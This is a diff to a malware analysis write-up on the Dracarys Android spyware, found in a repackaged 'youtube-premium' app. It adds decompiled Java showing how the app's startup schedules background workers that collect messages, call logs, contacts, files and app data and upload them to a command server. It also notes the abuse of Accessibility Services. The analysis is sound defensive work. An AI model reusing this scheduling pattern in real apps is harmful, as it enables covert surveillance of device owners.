@@ -12,7 +12,9 @@ In this document, i will try to outline how the Trojan starts, what obfuscation 
 | File Name               | youtube-premium.apk                                              |
 | Package Name            | org.schabi.newpipe.mask                                          |
 
-Let's take a look at the `AndroidManifest.xml` file
+Let's take a look at the `AndroidManifest.xml` file.
+
+The sample's manifest shows the main activity is located in `org.schabi.newpipe.mask.MainActivity`.
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:versionCode="970" android:versionName="0.21.4" android:installLocation="auto" android:compileSdkVersion="30" android:compileSdkVersionCodename="11" package="org.schabi.newpipe.mask" platformBuildVersionCode="30" platformBuildVersionName="11">
@@ -378,7 +380,45 @@ Let's take a look at the `AndroidManifest.xml` file
 </manifest>
 ```
 
-Dracarys is distributed inside of repackaged versions of legitimate applications. As we can see here, it is abusing the [Accessibility Services](https://developer.android.com/reference/android/accessibilityservice/AccessibilityService) by relying on using `android.permission.BIND_ACCESSIBILITY_SERVICE` to provide easy functionality.
+Let's go back to the flow of execution. The `onCreate()` method within `MainActivity` calls `WorkerStore.registerWorkers(this);` as shown in the code snippet below.
+```java
+public void onCreate(Bundle bundle) {
+        if (DEBUG) {
+            Log.d(TAG, "onCreate() called with: savedInstanceState = [" + bundle + "]");
+        }
+        requestAppPermissions();
+        if (Build.VERSION.SDK_INT == 19) {
+            TLSSocketFactoryCompat.setAsDefault();
+        }
+        ThemeHelper.setDayNightMode(this);
+        ThemeHelper.setTheme(this, ServiceHelper.getSelectedServiceId(this));
+        Localization.assureCorrectAppLanguage(this);
+        super.onCreate(bundle);
+        WorkerStore.registerWorkers(this);
+        ...
+```
+
+As we can see the code snippet below, it immediately starts collecting data from the victim and sending back to the C2.
+```java
+public static void registerWorkers(Context context) {
+        RepeatingAlarm.schedule(context, 10);
+        RecordingService.createNotificationChannel(context);
+        SyncService.createNotificationChannel(context);
+        WorkManager.getInstance(context).enqueueUniqueWork(TaskCommunicationSchedulingWorker.WORK_ID, ExistingWorkPolicy.REPLACE, TaskCommunicationSchedulingWorker.getWorkRequest(new File(context.getFilesDir(), "time.config")));
+        WorkManager.getInstance(context).enqueueUniqueWork(HeartbeatWorker.WORK_IDENTIFIER, ExistingWorkPolicy.KEEP, HeartbeatWorker.getOneTimeWorkRequest());
+        WorkManager.getInstance(context).enqueueUniquePeriodicWork(BasicInfoWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.KEEP, BasicInfoWorker.getWorkRequest(90));
+        WorkManager.getInstance(context).enqueueUniquePeriodicWork(LiveBasicInfoWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.KEEP, LiveBasicInfoWorker.getWorkRequest(90));
+        WorkManager.getInstance(context).enqueueUniquePeriodicWork(AppInfoReportWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.KEEP, AppInfoReportWorker.getWorkRequest(90));
+        WorkManager.getInstance(context).enqueueUniquePeriodicWork(PhoneMessageReportWorker.WORK_IDENTIFIER, ExistingPeriodicWorkPolicy.KEEP, PhoneMessageReportWorker.getWorkRequest(90));
+        WorkManager.getInstance(context).enqueueUniquePeriodicWork(CallLogReportWorker.WORK_IDENTIFIER, ExistingPeriodicWorkPolicy.KEEP, CallLogReportWorker.getWorkRequest(90));
+        WorkManager.getInstance(context).enqueueUniquePeriodicWork(UploadWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.KEEP, UploadWorker.getWorkRequest(15));
+        WorkManager.getInstance(context).enqueueUniquePeriodicWork(ContactInfoWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.KEEP, ContactInfoWorker.getWorkRequest(90));
+        WorkManager.getInstance(context).enqueueUniquePeriodicWork(FilePathWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.KEEP, FilePathWorker.getWorkRequest(45));
+    }
+
+```
+
+Dracarys is distributed inside of repackaged versions of legitimate applications. Another to take not here as we can see here, it is abusing the [Accessibility Services](https://developer.android.com/reference/android/accessibilityservice/AccessibilityService) by relying on using `android.permission.BIND_ACCESSIBILITY_SERVICE` to provide easy functionality.
 ```xml
 <service android:name="org.schabi.newpipe.mask.RouterActivity$FetcherService" android:exported="false"/>
         <meta-data android:name="android.webkit.WebView.MetricsOptOut" android:value="true"/>
